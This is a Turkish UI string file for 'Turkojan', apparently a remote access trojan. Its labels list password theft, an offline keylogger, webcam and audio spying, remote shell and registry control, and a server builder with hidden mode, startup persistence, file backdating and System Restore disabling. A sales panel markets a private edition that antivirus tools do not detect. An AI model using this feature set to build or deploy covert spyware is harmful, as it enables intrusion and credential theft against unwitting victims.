tlabelLabel1=Icq # :
tlabelLabel2=Web :
tlabelLabel3=Sehir :
fltpnlFlatPanel5=Mail'i|Yolla
flthntFlatPanel5=Mail'i Yolla
fltpnlFlatPanel14=Turkojan|Hakkinda|Destek|Al
[frmMessages]
fltttlFlatTitlebar1=Hazır Hata Mesajları
tflbtnbtnClose=X
fbthntbtnClose=Kapat
fltpnlFlatPanel4=||||Mesajı|Seç
flthntFlatPanel4=Mesajı Seç
fltpnlFlatPanel6=|Kapat
flthntFlatPanel6=Kapat
[frmKeyboard]
tflboxFlatGroupBox2=Ctrl+Alt+Del
fltpnlFlatPanel4=|||Kilitli
flthntFlatPanel4=Ctrl+Alt+Del'i Kitle
fltpnlFlatPanel5=||||Açık
flthntFlatPanel5=Ctrl+Alt+Del Kilidini Kaldır
tflboxFlatGroupBox1=Alt+Tab
fltpnlFlatPanel3=|||Kilitli
flthntFlatPanel3=Alt+Tab'i Kitle
fltpnlFlatPanel6=||||Açık
flthntFlatPanel6=Alt+Tab Kilidini Kaldır
tflboxFlatGroupBox3=Num-Lock
fltpnlFlatPanel7=|||Kapat
flthntFlatPanel7=Num-Lock'u Kapat
fltpnlFlatPanel8=|||Aç
flthntFlatPanel8=Num-Lock'u Aç
tflboxFlatGroupBox4=Caps-lock
fltpnlFlatPanel9=|||Kapat
flthntFlatPanel9=Caps-Lock'u Kapat
fltpnlFlatPanel10=|||Aç
flthntFlatPanel10=Caps-Lock'u Aç
tflboxFlatGroupBox5=Scroll-Lock
fltpnlFlatPanel11=|||Kapat
flthntFlatPanel11=Scroll_Lock'u Kapat
fltpnlFlatPanel12=|||Aç
flthntFlatPanel12=Scroll-Lock'u Aç
tflboxFlatGroupBox6=Tüm Tuşlar
fltpnlFlatPanel13=|||Kilitli
flthntFlatPanel13=Klavyedeki Tüm Tuşları Kitle
fltpnlFlatPanel14=|||Açık
flthntFlatPanel14=Klavye Kilidini Kaldır
tflboxFlatGroupBox7=Klavyedeki Işıkları Yakıp Söndür
fltpnlFlatPanel15=||Klavye|Işıklarını|Söndür
flthntFlatPanel15=Klavye Işıklarını Söndür
fltpnlFlatPanel16=|||Klavye|Işıklarını|Aç
flthntFlatPanel16=Klavye Işıklarını Aç
fltpnlFlatPanel18=Klavye|Yöneticisi
[frmSettings]
tflboxFlatGroupBox1=Kullanıcı adı 
tlabelLabel2=Kullanıcı adı :
tflboxFlatGroupBox3=DNS / IP
tlabelLabel3=Adres :
tflboxFlatGroupBox4=Server Ayarları
fltpnlFlatPanel5=|||||Server|Ayarlarını|Al
flthntFlatPanel5=Server Ayarlarını Al
fltpnlFlatPanel3=|||||Server|Ayarlarını|Kaydet
flthntFlatPanel3=Server Ayarlarını Kaydet
tflboxFlatGroupBox5=Server'i Kapat/Kaldır
fltpnlFlatPanel4=||||Server'i|Kapat[Geçici]|
flthntFlatPanel4=Server'i Kapat
fltpnlFlatPanel6=|||||Server'i|Kaldır[Tamamen]
flthntFlatPanel6=Server'i Kaldır
tflboxFlatGroupBox2=Port No 
tlabelLabel1=Baglantı Portu : 
tflboxFlatGroupBox6=Baglantı süresi
tlabelLabel4=Her
tlabelLabel5=saniyede bir bağlan
fltpnlFlatPanel12=Server|Ayarları
[frmPasswords]
fltpnlFlatPanel5=||||||Messenger
flthntFlatPanel5=Instant Messenger şifrelerini Al[Icq,Msn...]
fltpnlFlatPanel6=||||E-Posta
flthntFlatPanel6=E-Posta şifreleri'ni Al
fltpnlFlatPanel7=||Dialer
flthntFlatPanel7=Dialer şifreleri Al
fltpnlFlatPanel11=|||Kaydet
flthntFlatPanel11=şifreleri Kayit Et
fltpnlFlatPanel13=|||||Browser
flthntFlatPanel13=Browser şifrelerini Al[Explorer,Opera..]
fltpnlFlatPanel14=|||||FTP|şifreleri
flthntFlatPanel14=FTP şifreleri'ni Al
fltpnlFlatPanel3=||||||Downloader
flthntFlatPanel3=Downloader şifrelerini Al
fltpnlFlatPanel4=||||||Diğer|şifreler
flthntFlatPanel4=Diğer şifreleri Al
fltpnlFlatPanel12=Bilgisayardaki|şifreleri|Al
[frmShutDown]
tflboxFlatGroupBox1=Bilgisayar'ı Kapat
fltpnlFlatPanel4=||||||Bilgisayar'ı|Kapat
flthntFlatPanel4=Bilgisayar'ı Kapat
fltpnlFlatPanel6=||||Yeniden|Başlat
flthntFlatPanel6=Yeniden Başlat
fltpnlFlatPanel7=|||||Oturumu|Kapat
flthntFlatPanel7=Oturumu Kapat
tflboxFlatGroupBox11=Ekranı Ters Çevir
fltpnlFlatPanel24=||Ekranı|Dikey|Çevir
flthntFlatPanel24=Ekranı Dikey Çevir
fltpnlFlatPanel25=||Ekranı|Yatay|Çevir
flthntFlatPanel25=Ekranı Yatay Çevir
tflboxFlatGroupBox2=Sonsuz sayıda mesaj yolla
fltpnlFlatPanel5=|||||Mesaj'ı|Yolla
flthntFlatPanel5=Mesaj'ı Yolla
fltpnlFlatPanel12=Extra|Eğlence
[frmMouse]
tflboxFlatGroupBox1=Fare Kuyruğu'nun Boyutu
tlabelLabel1=5
tflboxFlatGroupBox2=Fare Çift Tıklama Hızı
fltpnlFlatPanel3=||||Ayarla
flthntFlatPanel3=Fare Çift Tıklama Hızını Ayarla
fltpnlFlatPanel4=||Öğren
flthntFlatPanel4=Fare Çift Tıklama Hızını Öğren
tflboxFlatGroupBox3=Fare'yi Kontrol Et
fltpnlFlatPanel5=||||Başlat
flthntFlatPanel5=Fare'yi Kontrol Etmeye Başla
fltpnlFlatPanel7=||||Durdur
flthntFlatPanel7=Fare'yi Kontrol Etmeye Son Ver
tflboxFlatGroupBox4=Fare'yi Delirt
fltpnlFlatPanel8=||||Başlat
flthntFlatPanel8=Fare'yi Delirtmeye Başla
fltpnlFlatPanel9=||||Durdur
flthntFlatPanel9=Fare'yi Delirtmeyi Durdur
tflboxFlatGroupBox5=Fare Tuşlari
fltpnlFlatPanel10=|||||Değiştir
flthntFlatPanel10=Fare Tuşları'nı Değiştir
fltpnlFlatPanel11=||||Düzelt
flthntFlatPanel11=Fare Tuşları'nı Düzelt
tflboxFlatGroupBox6=Fare Kilidi
fltpnlFlatPanel12=||||Açık
flthntFlatPanel12=Fare Kilidini Aç
fltpnlFlatPanel13=||||Kapalı
flthntFlatPanel13=Fare Kilidini Kapat
tflboxFlatGroupBox7=Fare'yi Zıplat
fltpnlFlatPanel14=||||Başlat
flthntFlatPanel14=Fare'yi Zıplatmaya Başla
fltpnlFlatPanel15=||||Durdur
flthntFlatPanel15=Fare'yi Zıplatmayi Durdur
tflboxFlatGroupBox8=Fare Kuyruğu
fltpnlFlatPanel6=||||Fare|Kuyruğu'nu|Ayarla
flthntFlatPanel6=Fare Kuyruğu'nun Boyutunu Ayarla
fltpnlFlatPanel18=Fare|Yöneticisi
[frmFun_1]
tflboxFlatGroupBox1=Masaüstü
fltpnlFlatPanel7=|||Gizle
flthntFlatPanel7=Masaüstü'nü Gizle
fltpnlFlatPanel3=|||||Göster
flthntFlatPanel3=Masaüstü'nü Göster
tflboxFlatGroupBox2=Masaüstü
fltpnlFlatPanel4=|||Kilitli
flthntFlatPanel4=Masaüstü'nü Kitle
fltpnlFlatPanel5=||||Açık
flthntFlatPanel5=Masaüstü Kılıdını Kaldır
tflboxFlatGroupBox3=Başlat Tuşu
fltpnlFlatPanel6=|||Gizle
flthntFlatPanel6=Başlat Tusu'nu Gizle
fltpnlFlatPanel8=|||||Göster
flthntFlatPanel8=Başlat Tuşu'nu Göster
tflboxFlatGroupBox4=Taskbar
fltpnlFlatPanel9=|||Gizle
flthntFlatPanel9=Taskbar'ı Gizle
fltpnlFlatPanel10=|||||Göster
flthntFlatPanel10=Taskbar'i Göster
tflboxFlatGroupBox5=Task Simgeleri
fltpnlFlatPanel11=|||Gizle
flthntFlatPanel11=Task Simgeleri'ni Gizle
fltpnlFlatPanel12=|||||Göster
flthntFlatPanel12=Task Simgeleri'ni Göster
tflboxFlatGroupBox6=Saat
fltpnlFlatPanel13=|||||Göster
flthntFlatPanel13=Saat'i Göster
fltpnlFlatPanel14=|||Gizle
flthntFlatPanel14=Saat'i Gizle
tflboxFlatGroupBox7=Monitor
fltpnlFlatPanel15=|||Açık
flthntFlatPanel15=Monitör'ü Aç
fltpnlFlatPanel16=||||Kapalı
flthntFlatPanel16=Monitör'ü Kapat
tflboxFlatGroupBox8=CD-Rom
fltpnlFlatPanel17=|||Açık
flthntFlatPanel17=CD-Rom'u Aç
fltpnlFlatPanel18=||||Kapalı
flthntFlatPanel18=CD-Rom'u Kapat
tflboxFlatGroupBox9=Taskbar
fltpnlFlatPanel19=|||Kilitli
flthntFlatPanel19=Taskbar'i Kilitle
fltpnlFlatPanel20=||||Açık
flthntFlatPanel20=Taskbar Kilidini Kaldır
tflboxFlatGroupBox10=Başlat Tuşu
fltpnlFlatPanel21=|||Kilitli
flthntFlatPanel21=Başlat Tuşu'nu Kitle
fltpnlFlatPanel22=||||Açık
flthntFlatPanel22=Başlat Tuşu Kilidini Kaldır
fltpnlFlatPanel23=Eğlence|Menüsü
[frmOffLogger]
fltpnlFlatPanel5=|Logları|Al
flthntFlatPanel5=Logları al
fltpnlFlatPanel7=||||Temizle
flthntFlatPanel7=Temizle
fltpnlFlatPanel1=|||||Kaydet
flthntFlatPanel1=Bilgileri Kaydet
fltpnlFlatPanel18=Offline|Keylogger
[frmAudio]
fltttlFlatTitlebar1=Ses iletişimi
tflbtnbtnClose=X
fbthntbtnClose=Kapat
fltpnlFlatPanel5=||||Başlat
flthntFlatPanel5=Başlat
tflboxFlatGroupBox1=Ses Özellikleri 
tlabelLabel1=Format : 
fltpnlFlatPanel3=||||Durdur
flthntFlatPanel3=Durdur
[frmExplorer]
tflboxFlatGroupBox1=Web Sayfası Aç
fltpnlFlatPanel3=||Git
flthntFlatPanel3=Web Sayfasina Götür
tflboxFlatGroupBox2=Internet Explorer Giriş Sayfasi
fltpnlFlatPanel4=||||Ayarla
flthntFlatPanel4=IE Giriş Sayfasi Olarak Ayarla
tflboxFlatGroupBox3=En Son Ziyaret Edilen 25 Web Sayfası
fltpnlFlatPanel5=||||Listeyi|Al
flthntFlatPanel5=En Son Ziyaret Edilen 25 Web Sayfasi'ni Öğren
fltpnlFlatPanel6=|||||Varsayılan
flthntFlatPanel6=Varsayılan Değerleri Ata
fltpnlFlatPanel7=|||Temizle
flthntFlatPanel7=Temizle
fltpnlFlatPanel12=Internet|Explorer|Ayarları
[frmRegistryEditor]
tlabelLabel8=registry editor\manager
fltttlFlatTitlebar2=Registry Editor
tflbtnbtnClose=X
fbthntbtnClose=Kapat
tlviewlvkeys0=anahtar adı
tlviewlvdataname0=isim
tlviewlvdataname1=veri
tmitemrefresh1=&Yenile
tmitemN1=-
tmitemedit1=&Düzenle
tmitemN2=-
tmitemdelete1=&Sil
tmitemN4=-
tmitemcreatenewstringvalue1=Yeni string olustur
tmitemcreatenewintegervalue1=Yeni integer oluştur
tmitemN3=-
tmitemsave1=Kaydet
tmitemCreatenewkey2=Yeni değer yarat
[frmRegistryCreate]
tlabelLabel1=Deger Tipi :
tlabelLabel2=Isim :
tlabelLabel4=Veri :
fltpnlFlatPanel13=|||||Tamam
flthntFlatPanel13=Tamam
imghntImage3=Tamam
fltpnlFlatPanel3=|||||Kapat
flthntFlatPanel3=Kapat
imghntImage1=Kapat
fltttlFlatTitlebar2=Registry Degeri
tflbtnbtnClose=X
fbthntbtnClose=Kapat
[frmEditor]
fltttlFlatTitlebar1=Server Editörü
tflbtnbtnClose=X
fbthntbtnClose=Kapat
tflboxFlatGroupBox2=Kullanıcı adı 
tlabelLabel1=Kullanıcı Adı :
tflboxFlatGroupBox3=DNS - IP (Sizin) 
tlabelLabel2=Adres : 
tflboxFlatGroupBox4=Port No 
tlabelLabel3=Baglantı Portu : 
tlabelLabel10=Dosya Adı : 
fltchkFlatCheckBox3=UPX v.3.02 kullanilarak server boyutu küçültülsün
fltpnlFlatPanel8=||||||Kaydet
flthntFlatPanel8=Server'i Kaydet
imghntImage7=Server'i Kaydet
tflboxFlatGroupBox5=Bağlantı süresi
tlabelLabel4=Her
tlabelLabel5=saniyede bir bağlan
tlabelLabel6=Registry Adı : 
fltchkFlatCheckBox1=Server'i bilgisayara kopyala
fltchkFlatCheckBox2=Windows açılışında çalışsın
tflboxFlatGroupBox1=Simge 
fltpnlFlatPanel13=|||||Varsayılan|
flthntFlatPanel13=Varsayılan Simge
imghntImage1=Varsayılan Simge
fltpnlFlatPanel4=||||||Simge|Seç
flthntFlatPanel4=Varsayılan Simge
imghntImage2=Yeni Simge Seç
fltpnlFlatPanel9=|||||Simge|Hırsızı
flthntFlatPanel9=Simge Hırsızı
imghntImage4=Varsayılan Simge
tlabelLabel7=Mesaj Başlığı : 
tlabelLabel8=Mesaj : 
tlabelLabel9=Msg Simgesi : 
fltpnlFlatPanel6=|||||Test
flthntFlatPanel6=Mesaji test et
imghntImage5=Mesaji test et
fltchkFlatCheckBox4=Mesaj gösterilsin
tflboxFlatGroupBox10=Çalişma modu 
fltrbtFlatRadioButton1=Yardim modu (görünebilir)
fltrbtFlatRadioButton2=Gizli mod (gizli calışır)
tflboxFlatGroupBox9=Diğer ayarlar 
fltchkFlatCheckBox6=Server çalışınca kaybolsun
fltchkFlatCheckBox7=Server'a eski bir tarih ver
fltchkFlatCheckBox8=Sistem geri yüklemeyi kapat
fltchkFlatCheckBox5=Kapatıldığında tekrar çalışsın
[frmBuy]
tlabelLabel1=Turkojan Public Edition
tlabelLabel2=, herhangi zararlı bir kod barındırmamakla
tlabelLabel3=birlikte bazı antivirus programları tarafından 'virus','istenmeyen yazılım' 
tlabelLabel4=ya da  'uzaktan yonetim aracı' olarak algılanmakta ve otomatik olarak
tlabelLabel5=silinmektedir. 
tlabelLabel6=Turkojan Private Edition
tlabelLabel7=, tamamen size ozel olarak hazırlanacağı
tlabelLabel8=için boyle bir problemle karşılaşmazsınız.Turkojan PE satın aldığınız tak-
tlabelLabel9=dirde programın kullanımıyla ilgili olarak 7/24 teknik destek alabilirsiniz.
tlabelLabel10=Turkojan Private Edition
tlabelLabel11=, satın aldiğiniz tarihten itibaren satın al-
tlabelLabel12=dığınız sürüme bağlı olarak belli bir süre içerisinde herhangi bir sorun ya-
tlabelLabel13=ratırsa yenisi ile değiştirilecektir.
tlabelLabel14=Turkojan Private Edition
tlabelLabel15=hakkındakı sorularınız ve ürünü satın al-
tlabelLabel16=mak için bizimle irtibata geçin.ürünün teslimat süresi ve fiyatı konusun-
tlabelLabel17=da sitemizden ve mail yoluyla bilgi alabilirsiniz.
tlabelLabel18=Satın almak için lütfen mail gonderin : 
tlabelLabel20=Detaylı bilgi için : 
fltpnlFlatPanel14=Ozel|Sürüm|Satın|Al
[frmServices]
tlviewLvwProcess0=Servis ismi :
tlviewLvwProcess1=Görünen isim :
tlviewLvwProcess2=Durum :
fltpnlFlatPanel4=|||Servis|Listesini|Al
flthntFlatPanel4=Servis Listesini Al
imghntImage3=Servis Listesini Al
fltpnlFlatPanel12=||||Seçili|Servis'i|Başlat
flthntFlatPanel12=Seçili Servis'i Başlat
imghntImage10=Seçili Servis'i Başlat
fltpnlFlatPanel13=||||Seçili|Servis'i|Durdur
flthntFlatPanel13=Seçili Servis'i Durdur
imghntImage11=Seçili Servis'i Durdur
fltpnlFlatPanel5=||||Seçili|Servis'i|Kaldır
flthntFlatPanel5=Seçili Servis'i Kaldır
imghntImage2=Seçili Servis'i Kaldır
fltpnlFlatPanel14=Servisler
[frmNotepad]
fltttlFlatTitlebar1=Okunan Metin
tflbtnbtnClose=X
fbthntbtnClose=Kapat
[frmRename]
fltttlFlatTitlebar1=Yeni Klasör Oluştur
tflbtnbtnClose=X
fbthntbtnClose=Kapat
fltpnlFlatPanel5=||||Tamam
flthntFlatPanel5=Tamam
[frmNewFol]
fltttlFlatTitlebar1=Yeniden Adlandır
tflbtnbtnClose=X
fbthntbtnClose=Kapat
fltpnlFlatPanel5=||||Tamam
flthntFlatPanel5=Tamam
[frmTerminate]
tlviewLvwProcess0=Uygulama Adı : 
tlviewLvwProcess1=PID :
fltpnlFlatPanel4=||||||Uygulama|Listesini|Yenile
flthntFlatPanel4=Uygulama Listesini Yenile
imghntImage3=Uygulama Listesini Yenile
fltpnlFlatPanel5=|||||Uygulamayı|Sonlandır
flthntFlatPanel5=Uygulamayı Sonlandır
imghntImage2=Uygulamayı Sonlandır
fltpnlFlatPanel14=Çalışan|Uygulamalar
[frmShell]
fltttlFlatTitlebar1=MS-DOS Komutlarını Kullan
tflbtnbtnClose=X
fbthntbtnClose=Kapat
[Thumb]
fltttlFlatTitlebar1=Resim Önizleme
tflbtnbtnClose=X
fbthntbtnClose=Kapat
[frmTransfer]
tlviewListView20=Nereye
tlviewListView21=Nereden
tlviewListView22=Boyut
tlviewListView23=Durum
fltpnlbutton7=||||||Dur
flthntbutton7=Transfer'i Durdur
tmitemDurdur1=Durdur
tmitemSil1=Sil
tmitemListeyiBosalt1=Listeyi Boşalt
[frmInsApps]
fltpnlFlatPanel5=||||Programları|öğren
flthntFlatPanel5=Programları öğren
fltpnlFlatPanel7=||Listeyi|Temizle
flthntFlatPanel7=Listeyi Temizle
fltpnlFlatPanel3=|||||Kaydet
flthntFlatPanel3=Bilgileri Kaydet
fltpnlFlatPanel18=Kurulu|Programlar
[frmStream]
fltttlFlatTitlebar1=Webcam Görüntüsü
tlabelLabel1=0 fps
tflbtnbtnClose=X
fbthntbtnClose=Kapat
tlabelLabel4=65
tlabelLabel5=5
fbthntFlatButton3=Video kaydını başlat
fbthntFlatButton4=Başlat
fbthntFlatButton6=Resmi kaydet
fbthntFlatButton8=Durdur
fbthntFlatButton1=Video kaydını durdur
fltpnlFlatPanel4=|||||Listeyi|Al
flthntFlatPanel4=Listeyi Al
[frmCredits]
fltpnlFlatPanel14=Program Hakkında

